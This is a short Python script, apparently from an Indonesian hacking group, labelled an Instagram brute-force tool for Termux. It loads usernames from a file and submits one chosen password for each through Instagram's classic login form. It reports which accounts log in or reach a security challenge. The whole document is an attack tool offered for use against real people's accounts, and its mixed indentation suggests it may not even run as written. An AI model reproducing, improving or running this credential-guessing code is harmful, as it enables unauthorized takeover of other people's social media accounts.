#!/data/data/com.termux/files/usr/bin/bash

# For Termux
# jangan ganti jika ingin dihargai
# script By HVmbl3 - Kanc0t Cyber Team
# IG Brute Force v.2.0
# Contact Me :
# 7/9/2018 v.1.0
# 29/8/2018 v.2.0

"""
Line : lazz110
kancotonline@gmail.com
"""

import mechanize,os

#Color
b="\033[0;34m"
g="\033[1;32m"
w="\033[1;37m"
r="\033[1;31m"
y="\033[1;33m"

br = mechanize.Browser()

br.set_handle_robots(False)
br.set_handle_refresh(False)
br.set_handle_gzip(False)
br.set_handle_equiv(True)
br.set_handle_referer(True)
br.set_handle_redirect(True)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Iceweasel/31.5.0')]


f = open('username.txt')

def brute():
    try:
        os.system('clear')
        print (g+"|=|============================|=|")
        print (y+"             IG Brute")
        print (y+"       Kancot Team - HVmbl3")
        print (y+"   https://github.com/kancotdiq")
        print (g+"|=|============================|=|")
        print ""
        username = f.readline()
        password = raw_input(b+"    Password  "+r+": "+y)
        print ""
        count = 1
        while username:
            br.open("https://www.instagram.com/accounts/login/?force_classic_login")
            br.select_form(nr=0)
            br.form[ 'username' ] = username.strip()
            br.form[ 'password' ] = password
            br.submit()
	    log = br.geturl()
            if log == "https://www.instagram.com/":
	        print (g+username.strip())
		os.sys.exit()
            elif 'challenge' in log:
		print (y+username.strip())
		os.sys.exit()
            else:
		print (r+username.strip())
            username = f.readline()
    except IndexError:
        print(r+"Exiting ..."+w)
		
if __name__ == "__main__":
	brute()
